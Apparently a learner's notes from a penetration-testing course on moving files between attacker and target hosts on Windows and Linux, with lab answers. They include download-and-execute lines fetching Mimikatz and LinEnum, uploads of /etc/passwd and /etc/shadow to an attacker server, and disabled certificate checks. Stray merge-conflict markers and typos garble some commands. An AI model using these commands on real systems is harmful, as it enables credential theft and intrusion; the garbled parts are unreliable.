\\\\\\\\\\\=================================
File transfers
\\Setting the storage
-understand how file transfers and how network operate . host maybe prevent our actions, like app whitelisting or AV/EDR blocking specific app or activities.
file transfers are also affected by network devies such as Firewalls, IDS, or IPS which can monitor or block particular ports or uncommon operations.
-File transfer is a core feature of any OS, and many tools exist to achive this. hwer many these tools may be blocked or monitored by diligent adm, and worth reviewing a reange of techniques that may be possible in a given environment
\\Windows File Transfer methods
atk can use various file transfer methods to operate and avoid being caught. defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised.
-blog post as an ex of an advanced persistent threat (APT)https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/
-Astaroth attack generally followed these steps: phishing link -> led to an LNK file open -> 
Execution WMIC tools with the "/format" parameter, which allowed the download and execution of malicious JavaScript code. the JavaScript code, in turn, down load
payload  by abusing the Bitadmin tool https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool
-> all payloads were bsaed64-encoded and decoded using the Certutil tool resulting in a few DLL files.
the regsvr32 tool : https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32
the used to loead one of the decoded DLLs. which decrypted and loaded other files ultil the final payload, Astaroth, was injected into the UserInit process 
-EX of multiple methods for file transfer and the threat actor using those methods to bypass defensiv
\\Download operations
task: access to machine MS02 need to download a file from pawnbox machine. let see how to accomplish this using multiple file download methods
\\PowerShell Base64 Encode & decode
this is a methods that donot require network comm. by access terminal encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation. decoding the file in the original content. 
-essential step of this method is to ensure file encode and decode is correct. use MD5Sum:https://man7.org/linux/man-pages/man1/md5sum.1.html
a program that calculates and verifies 128-bit MD5 checksums. 
\\Pwnbox check SSH Key MD5 hash
$md5sum id_rsa
\\Pwn encode SSH Key to Base64
$cat id_rsa |base64 -w 0;echo
=> copy string into a window powershell and use soem ps function to decode
$PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
-confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.5&viewFallbackFrom=powershell-7.2
$Get-FileHash C:\Users\Public\rd_rsa -Algorithm md5sum
Noote: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.
\\PowerShell Web downloads
-most companies allow http and HTTPS outbound traffic through the firewall to allow employee productivity leveraging these transportation methods for file transfer operation is very convinient.
still defenders can use web filtering solutions to prevent access to specific website categories, block the download of the file type (like .exe) or only allow access to a list of whitelisted domains in more restricted networks
-Power shell offer many file transfer options in any version of ps the System.Net.WebClient class can be used to download a file 
over http, https or FTP. the following table describes WebClient methods for downloading data from a resource:
Method	Description
OpenRead	Returns the data from a resource as a Stream.
OpenReadAsync	Returns the data from a resource without blocking the calling thread.
DownloadData	Downloads data from a resource and returns a Byte array.
DownloadDataAsync	Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile	Downloads data from a resource to a local file.
DownloadFileAsync	Downloads data from a resource to a local file without blocking the calling thread.
DownloadString	Downloads a String from a resource and returns a String.
DownloadStringAsync	Downloads a String from a resource without blocking the calling thread.
\\Powershell DownloadFile Method
specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name
\\File Download
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
\\PowerShell DownloadString - Fileless Method
fileless attacks work by using some OS functions to download the payload and execute it directly. 
-PS also be used to perform fileless attacks. instead of downloading a PS script to disk. 
we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
IEX also accepts pipeline input
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
\\PowerShell Invoke-WebRequest
-from ps 3.0 onwards. the Invoke-WebRequest cmdlet is also available, but it is noticably slower at downloading files.
 you can use the aliases iwr, curl and wget instead of Invoke-WebRequest 
 $PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-Harmj0y has complied an extensive list of PS download cradles :https://gist.github.com/HarmJ0y/bb48307ffa663256e239
it worth gaining familiarity with them and their nuances, such as lack of proxy awareness or touching disk (downloading a file onyo the target) to select the appropriate one for the situation
\\Common Errors with PowerShell=========================================
there may be cases when the Internet Explorer first lauch config has not been completed, which prevents the download
-by pass by -UseBasicParsing
$Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
$Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing| IEX  
-another error in PowerShell download isrelated to the SSL/TLS secure channel if the certificate is not trusted we can by 
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
\\SMB Downloads
the SMB tcp 445 is common in enterprise networks where Windows services are running. it enables app and users to transfer files to and from remote servers
- we can use SMB to download files from our Pwnbox easily. we need to create an SMB server in our Pwnbox with 
https://github.com/fortra/impacket/blob/master/examples/smbserver.py
from impacket and then use copy, move PowerShell Copy-Item or any other tool that allows conn to SMB
\\Create the SMB Server
$sudo impacket-smbserver share -smb2support /tmp/smbshare
\\Copy a File from the SMB Server
$copy \\192.168.220.133\share\nc.exe
new version of Window block unauthenticated guest access, as we can see in the following command:
$copy \\192.168.220.133\share\nc.exe
To transfer files in this scenarios, we can set a username and password using our Impacket SMB server and mount the SMB server on our Windows target machine:
\\Create the SMB Server with a Username and Password
$sudo Impacket-smbserver share -smb2support /tmp/smbshare -user test-password test
\\Mount the SMB Server with Username and Password
$net use n: \\192.168.220.133\share /user:test test
Note: you can also mount SMB server if receive an error when use copy filename \\IP\sharename
\\FTP Downloads
Another way to transfer files is using FTP (file Transfer Protocol), which use port TCP/21 and TCP/20 
-use FTP client or PS Net.WebClient to download files from an FTP server.
-config an FTP Server in our atk host using Python3 pyftpdlib module
\\Installing the FTP Server Python3 Module - pyftpdlib
$sudo pip3 install pyftpdlib
then we can specify port 21 because bydefault, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we dont set a user and Pwndoc
\\Setting up a Python3 FTP Server
$sudo python3 -m pyftpdlib --port 21
-After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PS Net.WebClient
\\Transferring Files from an FTP Server Using PowerShell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
-When we get a shell on a remote machine, we may not have an interactive shell if that case we can crete a FTP cmd line file to download a file.
->create a file containing the cmd we want to execute and then use the FTP client to use that file to download that file
$> echo open 192.168.49.128 > ftpcommand.txt
$> echo USER anonymous >> ftpcommand.txt
$> echo binary >> ftpcommand.txt
$> echo GET file.txt >> ftpcommand.txt
$> echo bye >> ftpcommand.txt
$> ftp -v -n -s:ftpcommand.txt
$>open 192.168.49.128 >USER anonymous 
$> GET file.txt >bye > more file.txt
\\Upload operations
-There are also situation such as pwd cracking, analysis, exfiltration, etc,...where we must upload files from our target machine into our atk host. we can use the same methods we used for download operation but now for uploads.
Lets see how we can accomplish uploading files in various ways.
\\PowerShell Base64 Encode & decode
Encode File Using PowerShell
PS$  [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)) [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
$ PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
->copy this content and paste it into our atk host, use the base64 command to decode it, and use the md5sum app to confirm the transfer happened correctly
\\Decode Base64 String in Linux
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
echo <string base64>= | base64 -d > hosts
$md5sum hosts
\\PowerShell Web uploads
PS doesn't have a buit-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function.,well also need a Web server that accepts uploads , which is not default option in most common webserver utilities
- use uploadserver, and extended module of the python HTTP.server module, which includes a file upload pages
\\Installing a configured WebServer with Upload
$pip3 install uploadserver
$python3 -m uploadserver
-> now use a PowerShell script PSUpload.ps1 which usese Invoke-RestMethod to perform the upload operations.
the scrip accept 2 parameters -File, which use to specify the file path, and -Uri, the server URL 
where upload our file
\\PowerShell Script to Upload a file to python Upload Server
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
\\PowerShell Base64 Web Upload
-other ways to use PS and base64 encoded files for upload operation is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. 
use Netcat to listen in on a port specify and send the file as POST request. -> copy the output and use the base64 decode function to convert the base 64 string into a file
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
<<<<<<< HEAD
-we catch base64 data with Netcat and use the base64 application with the decode option to convert the string to the file 
$nc -lvnp 8000
$echo <base64> | base64 -d -w 0 > hosts
\\SMB uploads
company usually allow outbound traffic using HTTP(TCP/80) and HTTPS (TCP/443) protocol. commonly enterprises don't alow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential atk/
- for more infor. read the Microsoft post prevent SMB traffic from lateral connections and entering or leaving the network
-an alternative is to run SMB over Http with WebDav.WebDav (RFC 4918) is extension of HTTP, the internet protocol that web browser and web server use to comm with each other.
-the WebDAV protocol enables a webserver to behave like a file server, supporting collaborative content authoring. WebDAV can also use HTTPS
- when use SMB it will first attempt to conn using the SMB protocol and if there's no SMB share available, it will try to conn using HTTP, in the following Wireshark  capture,
attempt to conn to the file share testing3, and because it didn;t find anything with SMB it uses HTTP.
\\Configurating WebDav Server
-need install 2 modules, wsgidav and cheroot https://github.com/mar10/wsgidav  -> run the wsgidav
$sudo pip3 install wsgidav cheroot
\\Using the WebDav Python module
-sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
\\Connecting to the Webdav share
->attempt to connect to the share using DavWWWRoot directory
$dir \\192.168.49.128\DavWWWRoot
NOTE: DavWWWRoot is special keword recognized by the Windows Shell. No Such folder exists on your WebDAV server. the DavWWWRoot keyword tells the Mini-Redirector driver.which handles WebDAV request that you are conn to the root of the WebDAV server
-you can avoid using this keyword if you specify a folder that exists on server when conn to the server for ex: \192.168.49.128\sharefolder
\\Uploading Files using SMB
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
NOTE: if there are no SMB (TCP/445) restrictions you can use impacket-smbserver the same way we set it up for download operations
\\FTP uploads
upload file using FTP very simlilar with downloading files. -use PS or the FTP client to complete the operation. before stat FTP server using the python module pyftpdlib. we need to specify the option --write to allow clients to upload files to our atk host
$sudo python3 -m pyftpdlib --port 21 --write
-> let use PS upload function to upload a file to our FTP server
\\PowerShell Upload File
PS C:\htb> (New-Objec129t Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
\\Cerate a Command File for the FTP Client to Upload a File
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
<test> 10.129.27.46
Download the file flag.txt from the web root using wget from the Pwnbox. 
Submit the contents of the file as your answer.
(New-Object System.Net.WebClient).DownloadFile('http://STMIP/flag.txt', "/home/htb-ac413848/flag.txt")
$wget http://STMIP/flag.txt  -> type ./flag.txt
<test>Upload the attached file named upload_win.zip to the target using the method o
f your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.
wget https://academy.hackthebox.com/storage/modules/24/upload_win.zip
-> $xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!:
-> start http server on target $python3 -m http.server <port>
-> upload file $iwr http://<iptarget>:<port>/upload_win.zip -OutFile upload_win.zip
-> $Expand-Archive .\upload_win.zip
-> $hasher.exe .\upload_win\upload_win.txt
<test>Connect to the target machine via RDP and practice various file transfer operations
 (upload and download) with your attack host. Type "DONE" when finished
 <1> utilize $urlretrieve function from the urllib.request 
$python3 -> import urllib.request as request ->cat
$request.urlretrieve("http://STMIP/flag.txt", "flag.txt");
<2> $ssh htb-student@STMIP (HTB_@cademy_stdnt!:)
wget https://academy.hackthebox.com/storage/modules/24/upload_nix.zip
unzip upload_nix.zip
->$scp upload_nix.txt htb-student@SMTIP:~/
or -> listens on aport and redirect the input it receives 
$nc -lp <port9999> > upload_nix.txt  --> nc -w 3 stmip stmport < upload_nix.txt
-> $haser upload_nix.txt

\\\\\\\========================================
Linux File Transfer methods
few download method
=======
\\\\\\==================================
LInux File transfer methods
few: cURL, wget, Python, all use HTTP to communicate
although  Linux can comm via FTP, SMB like Windows, most malware on all diff oS use HTTP and HTTPS for comm
\\Download operations
\\Base64Encoding / decoding
- an method that does not require network comm, by encode a file to a base 64 string > copy its content into the terminal then perform the reverse operation
Bash>$md5sum id_rsa 
- we can use cat to print the file content, and base64 encode the output using a pipe | 
use option -w 0 to create only one line and ended up with the command with a semi-colon(;) and echo to start new line and make it easier to copy
$cat id_rsa | base64 -w 0;echo
> coopy it to target linux $echo -n '<string base64>' | base64 -d > id_rsa
confirm it was tranferred successfully using the md5sum command
\\Linux - Confirm the MD5 Hashes IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo
$md5sum id_rsa 
NOTE: we can upload file using the reverse operation.from compromised target cat and base64 encode a file and decode it in pawnbox
\\Web Downloads with Wget and cURL
2 most common utilities in Linux distro to interact with web app are wget and curl 
wget need to specify the URL and the option '-O' to set the output filename
\\Download a File Using wget
$wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
cURL is very similar to wget. but the output filename option is lowercase '-o'
$curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
\\Fileless Attack using Linux
because the way linux work and how pipes operation, most of the tools we use in Linux can be used to replicate fileless operation, which means that we dont have to download a file to execute it
NOTE: some payload such as mkfifo write files to disk, keep in mind that while the execution of the payload may be fileless when use a pipe, depending on the payload chosen it may create temp files on the OS
\\Fieless Download with cURL
$curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
similar we can download a python script file from a web svr and pipe it into the python inary /
\\Fileless download with wget 
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
this wwill execute 
\\Download with Bash (/dev/tcp)
in case non of well-known file transfer tools are available. as long as Bash version 2.04 or greater is installed (
    compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file download
\\Connect to the Target webserver
$exec 3<>/dev/tcp/10.10.10.32/80
\\HTTP GET request
$exec -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
\\Print the Response
$cat <&3
\\SSH Downloads
SSH comes with an SCP utility for remote file transfer by default uses the SSH Protocol
SCP (secure copy) is a command-line utility allow copy and directories betw 2 host securely. we can copy file from local to remote svr and from remote svr to our mochine
SCP is very similar to copy or cp but insted of provie a local path we need a specify a username the remote IP addr or DNS name , and the user's credentials
\\Enabling the SSH Server
$sudo systemctl enable SSH
\\Starting the SSH Server
$sudo systemctl start SSH
\\Checking for SSH listening port
$netstat -lnpt 
\\Bigin downloading File using SCP 
$scp plaintext@192.169.49.128:/root/myroot.txt .
scp username@remote_host:/path/file /path/destination
NOTE: we can create a temp user account for file transfer and avoid using your primary cred or keys on a remote computer
\\Upload operations
There also situation such as binary exploitation and packet capture analysis, where we must upload files from target machine onto or atk host.
the methods for downloads will also work for uploads 
\\Web upload
- upload server https://github.com/Densaugeo/uploadserver extended module of the Python HTTP.server module which includes a file upload page.
\\Pwnbox - start Web Server
$sudo python3 -m pip install --user upload server
\\pwn - Create a Self-Signed certificate
$openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
-The Websvr should not hos the cert, we recommend creating a new dir to host the file for our server
\\Pwnbox - Start web server
$mkdir https && cd https
$sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
\\Linux - Upload Multiple Files
$curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
option --insecure because we used a self-signed cert that we trusted
\\Alternative Web File Transfer Method
linux distro usually have python or php installed, starting a web server to transfer file is straightforward.
if the server compromised is a web svr, we can move the files we want to transfer to the web svr dir and access them from the web page which means that we are downloadng the file prom Pwnbox
- it is possible to stand up a web svr using various languages. A compromised Linux Machine may not have a web server installed. in such cases we can use a mini web svr. what they perhaps lack in security, they make up for flexibility as the webroot location and listening ports can quickly be changed
\\Linux-Creating a Web Server with Python3
$python3 -m http.server
\\Linux- Creating a Web Server with Python2.7
$python2.7 -m SimpleHTTPServer
\\linux-Creating a Web Server with php
$php -S 0.0.0.0:8000
\\Linux- Creating a Web Server with Ruby 
$ruby -run -ehttpd . -p8000
\\Download the File from the Target Machine onto the Pwnbox
$wget 192.168.49.128:8000/filetotransfer.txt
Note: when we start a new web server using Python or PHP, its important to consider that inbound traffic maybe blocked we are transferring a file from our target onto our atk host, but we are not uploading the file
\\SCP Upload
some company allow the SSH protocol (TCP/22) for outbound conn, and if that's the case, we can use an SSH svr with the scp utility to upload files,
attemp to upload files to target machine using the SSH protocol 
\\File Upload using SCP
$scp /etc/passwd htp-student@10.129.86.90:/home/htb-student/
NOTE: scp syntax is similar to cp or copy
>>>>>>> 39bc7fb0350c486491dcf3684960e59e815ff038
10.129.122.234
<test>Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.
wget http://<ip>/flag.txt
<test>
Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, extract the file, and run "hasher <extracted file>" from the command line. Submit the generated hash as your answer.
$ssh <username>@<ip>
open http.server on pwnbox > python3 -m http.server 9000  || scp upload_nix.txt htb-student@ip:~/
|| nc -lp <port> > upload_nix.txt >> use pawn nc -w 3 <ip> <port> < upload_nix.txt
> wget <ip>:<port>/<file>  >>  $Expand-Archive .\upload_win.zip
-> $hasher.exe .\upload_win\upload_win.txt
|| md5sum <file> > cat <file> | base64 -w 0;echo >> ontarget echo -n '<base64>' | base64 -d > <filename>
\\\\\\\\\\\\========================================
Transferring File with Code
check for the programming languege installed on host 
- default windows app such as cscript and mshta, to execute JavaScript or VBScript code JavaScript can also run on Linux hosts.
\\python 
-it can run one-liners from an OS command line using option -C
\\pthon2-Download'
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
\\PHP
-PHP very prevalent  and provide various file data transfer
-try to use the PHP file_get_contents() module to download and the file_put_contents() module to save the file into a directory. 
- it can be use to run one-liners from a OS command line using the option -raw
\\PHP Downloading with File_get_contents()
$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
\\PHP Download with Fopen()
$php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
- we can also send the downloaded contents to a pipe instead simiar to the fileless ex we executed in the previous section using cURL and wget
\\PHO Download a File and Pipe it to Bash
$php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | 
NOTE: the URL can be used as a filename with the @file function if the toopen wrappers have been enabled
\\Other languages
ruby and perl can be use to transfer file and one-liners with -each
\\Ruby-Downlaod a File
$ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
\\Perl - Download a File
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
\\JavaScript
>try to create wget.js 
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
=> then use command from a Windows command or Powershell terminal to execute our JS code
\\Download a File Using JavaScript and csript.exe
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
\\VBScript
VBSCript preinstalled by default in every desktop release of microsoft windows since windows 98
eX: wget.VBS 
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
\\download a file Using VBScript and csript.exe
